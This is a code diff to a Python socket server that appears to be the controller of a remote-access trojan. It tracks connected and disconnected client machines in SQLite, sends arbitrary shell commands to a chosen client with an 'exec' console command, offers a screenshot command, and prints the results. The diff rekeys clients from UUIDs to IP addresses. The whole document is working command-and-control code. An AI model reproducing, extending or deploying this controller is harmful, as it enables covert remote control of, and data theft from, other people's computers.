@@ -40,8 +40,7 @@ def create_tables():
     CREATE TABLE IF NOT EXISTS clients (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         ip TEXT NOT NULL,
-        port INTEGER NOT NULL,
-        client_id TEXT NOT NULL
+        port INTEGER NOT NULL
     )
     ''')
 
@@ -49,44 +48,55 @@ def create_tables():
     CREATE TABLE IF NOT EXISTS offline_clients (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         ip TEXT NOT NULL,
-        port INTEGER NOT NULL,
-        client_id TEXT NOT NULL
+        port INTEGER NOT NULL
     )
     ''')
 
     conn.commit()
 
 def handle_client(conn, addr):
-    client_id = str(uuid.uuid4())
-    active_clients[client_id] = conn
-    save_client(addr[0], addr[1], client_id)
+    if addr[0] in active_clients:
+        conn.close()
+        return
+    active_clients[addr[0]] = conn
+    save_client(addr[0], addr[1])
     print(f"[+] Connection {addr[0]}:{addr[1]}")
     
-    threading.Thread(target=listen_client, args=(conn, client_id), daemon=True).start()
+    threading.Thread(target=listen_client, args=(conn, addr[0]), daemon=True).start()
 
-def save_client(ip, port, client_id):
+def save_client(ip, port):
     with sqlite3.connect('clients.db', check_same_thread=False) as conn:  
         cursor = conn.cursor()
+
+        cursor.execute("SELECT id FROM clients WHERE ip = ?", (ip,))
+        existing = cursor.fetchone()
+        if existing:
+            print(f"Client {ip} already exists")
+            return
+
         cursor.execute('''
-        INSERT INTO clients (ip, port, client_id)
-        VALUES (?, ?, ?)
-        ''', (ip, port, client_id))
+        INSERT INTO clients (ip, port)
+        VALUES (?, ?)
+        ''', (ip, port))
         conn.commit()
 
-def remove_client(client_id):
+def remove_client(client_ip):
     with sqlite3.connect('clients.db', check_same_thread=False) as conn:  
         cursor = conn.cursor()
         
         cursor.execute('''
-        INSERT INTO offline_clients (ip, port, client_id)
-        SELECT ip, port, client_id FROM clients WHERE client_id = ?
-        ''', (client_id,))
+        INSERT INTO offline_clients (ip, port)
+        SELECT ip, port FROM clients WHERE ip = ?
+        ''', (client_ip,))
         conn.commit()
 
         cursor.execute('''
-        DELETE FROM clients WHERE client_id = ?
-        ''', (client_id,))
+        DELETE FROM clients WHERE ip = ?
+        ''', (client_ip,))
         conn.commit()
+
+        if client_ip in active_clients:
+            del active_clients[client_ip]
 
 def repl():
     while True:
@@ -130,7 +140,7 @@ def cmd_clients(args):
         cursor.execute('SELECT * FROM clients')
         online_clients = cursor.fetchall()
         for client in online_clients:
-            print(f"{client[1]}:{client[2]} ID: {client[3]}")
+            print(f"ID: {client[0]} | {client[1]}:{client[2]}")
 
     print("\nOffline Clients")
     with sqlite3.connect('clients.db', check_same_thread=False) as conn:
@@ -138,22 +148,22 @@ def cmd_clients(args):
         cursor.execute('SELECT * FROM offline_clients')
         offline_clients = cursor.fetchall()
         for offline_client in offline_clients:
-            print(f"{offline_client[1]}:{offline_client[2]} ID: {offline_client[3]}")
+            print(f"ID: {offline_client[0]} | {offline_client[1]}:{offline_client[2]}")
 
 def cmd_exec(args):
     if len(args) < 2:
-        print("Usage: exec <id> <command>")
+        print("Usage: exec <ip> <command>")
         return
-    target_id = args[0]
+    target_ip = args[0]
     command = " ".join(args[1:]) 
 
-    target_client = active_clients.get(target_id)
+    target_client = active_clients.get(target_ip)
     if not target_client:
-        print(f"[!] Cliente com ID {target_id} não está conectado.")
+        print(f"[!] Cliente com ID {target_ip} não está conectado.")
         return
 
     try:
-        send(target_id, command, target_client)
+        send(target_ip, command, target_client)
     except Exception as e:
         print(f"[!] Failed to send command: {e}")
 
@@ -162,38 +172,41 @@ def cmd_screenshot(args):
 
 def cmd_remove(args):
     if len(args) < 1:
-        print("Usage: remove <id> ")
+        print("Usage: remove <ip> ")
         return
-    client_id = args[0]
+    client_ip = args[0]
     with sqlite3.connect('clients.db', check_same_thread=False) as conn:  
         cursor = conn.cursor()
         
         cursor.execute('''
-        DELETE FROM clients WHERE client_id = ?
-        ''', (client_id,))
+        DELETE FROM clients WHERE ip = ?
+        ''', (client_ip,))
         conn.commit()
 
-def send(target_id, command, target_client):
+def send(target_ip, command, target_client):
     target_client.send(command.encode())
-    print(f"[>] Command sent to {target_id}: {command}")
+    print(f"[>] Command sent to {target_ip}: {command}")
         
-def listen_client(conn, client_id):
+def listen_client(conn, client_ip):
     while True:
         try:
-            data = conn.recv(4096).decode().strip()
-            if data:
-                print(f"[<] Mensagem de {client_id}:\n{data}")
+            while True:
+                data = conn.recv(4096).decode().strip()
+                if data:
+                     print(f"[<] Mensagem de {client_ip}:\n{data}")
         except ConnectionResetError:
-            print(f"[!] Client {client_id} disconected")
-            remove_client(client_id)
+            print(f"[!] Client {client_ip} disconected")
+            remove_client(client_ip)
             break
         except KeyboardInterrupt:
-            print(f"[!] Client {client_id} disconected")
-            remove_client(client_id)
+            print(f"[!] Client {client_ip} disconected")
+            remove_client(client_ip)
             break
         except Exception as e:
-            print(f"[!] Erro ao receber mensagem de {client_id}: {e}")
+            print(f"[!] Error on receive message from {client_ip}: {e}")
             break
+        finally:
+            conn.close()
 
 COMMANDS = {
     "help": cmd_help,
